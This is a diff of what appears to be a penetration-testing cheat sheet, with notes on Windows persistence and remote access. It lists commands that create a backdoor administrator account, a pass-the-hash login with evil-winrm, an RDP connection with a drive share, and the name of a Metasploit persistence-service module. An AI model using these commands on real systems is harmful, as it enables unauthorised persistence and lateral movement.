@@ -424,11 +424,13 @@ metasploit tfp server module on Kali
     C:\Windows\System32\drivers\etc\host        Windows DNS entries  
  ____
  # Persistence 
- Methods: registry keys, startup folders, scheduled tasks, WMI permanent events.
+ Methods: service, registry keys, startup folders, scheduled tasks, WMI permanent events.
  
      net user USERNAME PASSWORD /add
      net localgroup Administrators USERNAME /add
      net localgroup "Remote Management Users" USERNAME /add    
+     
+ Use Metasploit module exploit/windows/local/persistence_service to add a service     
  ## Access  
      pass the hash: evil-winrm -u Administrator -H ADMIN_HASH -i IP  
      xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share   
